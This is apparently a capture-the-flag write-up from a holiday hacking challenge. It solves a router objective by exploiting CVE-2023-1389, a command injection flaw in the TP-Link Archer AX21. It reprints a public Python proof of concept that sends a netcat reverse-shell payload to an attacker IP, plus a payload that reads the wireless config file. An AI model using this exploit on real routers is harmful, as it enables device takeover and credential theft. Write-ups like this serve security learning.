---
layout: default
title: act2_dosis_network_down_mjd
nav: |
  <table>
  <thead>
  <tr>
  <th>[Previous Objective: Act2 IDORable Bistro](/act3_idorable_bistro_mjd.md)</th>
  <th>[Home Page](/index.md)</th>
  <th>[Next Objective: Act2 Rogue Gnome Identity Provider](/act2_rogue_gnome_identity_provider_mjd.md)</th>
  </tr>
  </thead>
  <tbody>
  </tbody>
  </table>
---
<table>
<thead>
<tr>
<th>Objective: Dosis Network Down</th>
<br>
<th>Difficulty Level: 2</th>
</tr>
</thead>
<tbody>
<tr>
<td>Drop by JJ's 24-7 for a network rescue and help restore the holiday cheer.<br> What is the WiFi password found in the router's config?</td>
<br>
<td>Location: JJ's 24-7</td>
</tr>
</tbody>
</table>

<h2>Solution Overview</h2>

The objective is to gain access to the router configuration and the password it contains. The target device appears to be running the patched firmware version (1.1.4 Build 20230219), but testing is still required to verify the patch is effective. The vulnerability exists in the <code>/cgi-bin/luci;stok=/locale</code> endpoint where the country parameter is not properly sanitized before being passed to <code>popen()</code>. An unauthenticated attacker can exploit this by sending crafted GET requests to inject commands that execute with root privileges. The exploit requires sending the malicious request twice: the first sets the command and the second executes it. Publicly available proof-of-concept code demonstrates how to obtain a reverse shell using this vulnerability.  In this case, the attack used a simple payload to read the <code>/etc/config/wireless</code> configuration file, which contains wireless network settings including SSIDs and encryption parameters. The exploitation successfully extracted the WiFi password "SprinklesAndPackets2025!" from the router's configuration.

<table>
<thead>
<tr>
<th>Activity</th>
<br>
<th>Primary Tactic</th>
<br>
<th>MITRE ATT&CK Technique ID</th>
<br>
<th>MITRE ATT&CK Technique Name</th>
</tr>
</thead>
<tbody>
<tr>
<td>Identify vulnerable TP-Link Archer AX21 router running outdated firmware</td>
<br>
<td>Reconnaissance</td>
<br>
<td>T1595.002</td>
<br>
<td>Active Scanning: Vulnerability Scanning</td>
</tr>
<tr>
<td>Access the router's web management interface without authentication</td>
<br>
<td>Initial Access</td>
<br>
<td>T1190</td>
<br>
<td>Exploit Public-Facing Application</td>
</tr>
<tr>
<td>Craft malicious GET request with command injection payload in country parameter</td>
<br>
<td>Execution</td>
<br>
<td>T1059.004</td>
<br>
<td>Command and Scripting Interpreter: Unix Shell</td>
</tr>
<tr>
<td>Send request twice to <code>/cgi-bin/luci;stok=/locale</code> endpoint to set and execute command</td>
<br>
<td>Execution</td>
<br>
<td>T1203</td>
<br>
<td>Exploitation for Client Execution</td>
</tr>
<tr>
<td>Execute injected commands with root privileges via <code>popen()</code> function</td>
<br>
<td>Privilege Escalation</td>
<br>
<td>T1068</td>
<br>
<td>Exploitation for Privilege Escalation</td>
</tr>
<tr>
<td>Read <code>/etc/config/wireless</code> configuration file containing network credentials</td>
<br>
<td>Credential Access</td>
<br>
<td>T1552.001</td>
<br>
<td>Unsecured Credentials: Credentials In Files</td>
</tr>
<tr>
<td>Extract WiFi password (SprinklesAndPackets2025!) from wireless configuration</td>
<br>
<td>Collection</td>
<br>
<td>T1005</td>
<br>
<td>Data from Local System</td>
</tr>
</tbody>
</table>

<h2>Detailed Solution</h2>
<details>
<summary>Click to expand</summary>

Device Information

<img src="/HHC_2025/images/dosisnetwork_versioninfo.jpg" alt="Router logon screen showing Archer AX21 device information">

The logon screen indicates that this is an <strong>Archer AX21 v2.0</strong> running firmware version <strong>1.1.4 Build 20230219</strong>.

TP-Link Archer AX21 (AX1800) firmware versions before 1.1.4 Build 20230219 contained a command injection vulnerability in the country form of the <code>/cgi-bin/luci;stok=/locale</code> endpoint on the web management interface. Specifically, the country parameter of the write operation was not sanitized before being used in a call to <code>popen()</code>, allowing an unauthenticated attacker to inject commands, which would be run as root, with a simple POST request.

The following is a recent, known vulnerability. While the firmware version suggests it is patched, it needs to be tested.

CVE-2023-1389 -- Command Injection / Remote Code Execution

<ul>
<li><strong>Description:</strong> A command injection vulnerability exists in the Archer AX21 firmware (before version 1.1.4 Build 20230219). Attackers can send crafted POST requests to the router's web management interface, specifically the <code>/cgi-bin/luci;stok=/locale</code> endpoint, to inject commands.</li>
</ul>

<ul>
<li><strong>Impact:</strong> Successful exploitation grants <strong>root access</strong> to the device, enabling full control.</li>
</ul>

<ul>
<li><strong>Severity:</strong> CVSS base score of <strong>8.8 (High)</strong>.</li>
</ul>

<ul>
<li><strong>Exploitation:</strong> Proof-of-concept code is publicly available, and attackers have used this flaw to deploy <strong>Mirai malware</strong> onto vulnerable devices.</li>
</ul>

<ul>
<li><strong>Mitigation:</strong> TP-Link released patched firmware (v1.1.4 Build 20230219 and later). Devices linked to a TP-Link ID can receive update notifications automatically via the web interface or Tether app.</li>
</ul>

Exploit Code Analysis

<img src="/HHC_2025/images/dosisnetwork_exploitdb.jpg" alt="Exploit-db entry for CVE-2023-1389">

From exploit-db, the exploit code provides insight into the request structure needed:

<pre><code class="language-python">
<br>
#!/usr/bin/python3
<br>
#
<br>
<h1>Exploit Title: TP-Link Archer AX21 - Unauthenticated Command Injection</h1>
<br>
<h1>Date: 07/25/2023</h1>
<br>
<h1>Exploit Author: Voyag3r (https://github.com/Voyag3r-Security)</h1>
<br>
<h1>Vendor Homepage: https://www.tp-link.com/us/</h1>
<br>
<h1>Version: TP-Link Archer AX21 (AX1800) firmware versions before 1.1.4 Build 20230219</h1>
<br>
<h1>Tested On: Firmware Version 2.1.5 Build 20211231 rel.73898(5553); Hardware Version Archer AX21 v2.0</h1>
<br>
<h1>CVE: CVE-2023-1389</h1>
<br>
#
<br>
<h1>Disclaimer: This script is intended to be used for educational purposes only.</h1>
<br>
<h1>Do not run this against any system that you do not have permission to test.</h1>
<br>
<h1>The author will not be held responsible for any use or damage caused by this program.</h1>
<br>
#
<br>
<h1>CVE-2023-1389 is an unauthenticated command injection vulnerability in the web</h1>
<br>
<h1>management interface of the TP-Link Archer AX21 (AX1800), specifically, in the</h1>
<br>
<h1><em>country</em> parameter of the <em>write</em> callback for the <em>country</em> form at the</h1>
<br>
<h1>"/cgi-bin/luci/;stok=/locale" endpoint. By modifying the country parameter it is</h1>
<br>
<h1>possible to run commands as root. Execution requires sending the request twice;</h1>
<br>
<h1>the first request sets the command in the <em>country</em> value, and the second request</h1>
<br>
<h1>(which can be identical or not) executes it.</h1>
<br>
#
<br>
<h1>This script is a short proof of concept to obtain a reverse shell. To read more</h1>
<br>
<h1>about the development of this script, you can read the blog post here:</h1>
<br>
<h1>https://medium.com/@voyag3r-security/exploring-cve-2023-1389-rce-in-tp-link-archer-ax21-d7a60f259e94</h1>
<br>
<h1>Before running the script, start a nc listener on your preferred port -> run the script -> profit</h1>

import requests, urllib.parse, argparse
<br>
from requests.packages.urllib3.exceptions import InsecureRequestWarning

<h1>Suppress warning for connecting to a router with a self-signed certificate</h1>
<br>
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

<h1>Take user input for the router IP, and attacker IP and port</h1>
<br>
parser = argparse.ArgumentParser()
<br>
parser.add_argument("-r", "--router", dest = "router", default = "192.168.0.1", help="Router name")
<br>
parser.add_argument("-a", "--attacker", dest = "attacker", default = "127.0.0.1", help="Attacker IP")
<br>
parser.add_argument("-p", "--port",dest = "port", default = "9999", help="Local port")
<br>
args = parser.parse_args()

<h1>Generate the reverse shell command with the attacker IP and port</h1>
<br>
revshell = urllib.parse.quote("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc " + args.attacker + " " + args.port + " >/tmp/f")

<h1>URL to obtain the reverse shell</h1>
<br>
url_command = "https://" + args.router + "/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(" + revshell + ")"

<h1>Send the URL twice to run the command. Sending twice is necessary for the attack</h1>
<br>
r = requests.get(url_command, verify=False)
<br>
r = requests.get(url_command, verify=False)
<br>
</code></pre>

Key portion of the script:

<pre><code class="language-python">
<br>
<h1>URL to obtain the reverse shell</h1>
<br>
url_command = "https://" + args.router + "/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(" + revshell + ")"

<h1>Send the URL twice to run the command. Sending twice is necessary for the attack</h1>
<br>
</code></pre>

<img src="/HHC_2025/images/dosisnetwork_200.jpg" alt="Testing GET request structure showing 200 OK response">

Work with the structure of the GET request until you get a <strong>200 OK</strong> response, indicating that the structure is valid.

Once the structure is verified, insert a payload.

On the TP-Link Archer AX21, the file <code>/etc/config/wireless</code> is part of the <strong>OpenWrt-style configuration system</strong> used in TP-Link firmware. It stores the <strong>wireless interface definitions</strong> - things like SSIDs, encryption settings, channels, and radio parameters. However, in the stock TP-Link firmware, this file is not normally user-accessible; it's managed internally by the router's web interface and app. If you flash the router with <strong>OpenWrt</strong>, then <code>/etc/config/wireless</code> becomes editable and contains the full wireless configuration in a structured text format.

The simplest payload is to print the file:

<pre><code class="language-">
<br>
$(cat%20/etc/config/wireless)
<br>
</code></pre>

<img src="/HHC_2025/images/dosisnetwork_solution.jpg" alt="Payload execution showing wireless configuration file contents">

<strong>Answer: SprinklesAndPackets2025!</strong>

</details>

<h2>Tools Reference</h2>

<table>
<thead>
<tr>
<th>Tools Used</th>
<br>
<th>Tool Version</th>
</tr>
</thead>
<tbody>
<tr>
<td>Burp Suite Community Edition</td>
<br>
<td>v2024.11.2</td>
</tr>
<tr>
<td>Exploit-db</td>
<br>
<td>N/A</td>
</tr>
</tbody>
</table>

<h2>Hints Reference</h2>
<table>
<thead>
<tr>
<th>Provided By</th>
<br>
<th>Hint</th>
</tr>
</thead>
<tbody>
<tr>
<td>Santa</td>
<br>
<td>You know...if my memory serves me correctly...there was a lot of fuss going on about a UCI (I forgot the exact term...) for that router.</td>
</tr>
<tr>
<td>Santa</td>
<br>
<td>I can't believe nobody created a backup account on our main router...the only thing I can think of is to check the version number of the router to see if there are any...ways around it...</td>
</tr>
<tr>
<td>JJ</td>
<br>
<td>Alright then. Those bloody gnomes have proper messed about with the neighborhood's wifi - changed the admin password, probably mucked up all the settings, the lot.Now I can't get online and it's doing me head in, innit? We own this router, so we're just taking back what's ours, yeah? You reckon you can help me hack past whatever chaos these little blighters left behind? What is the WiFi password found in the router's config?</td>
</tr>
</tbody>
</table>

<h2>Acknowledgements</h2>
<table>
<thead>
<tr>
<th>Provided By</th>
<br>
<th>Notes</th>
</tr>
</thead>
<tbody>
<tr>
<td>raffi</td>
<br>
<td>directed me to look at the exploit-db poc code carefully</td>
</tr>
</tbody>
</table>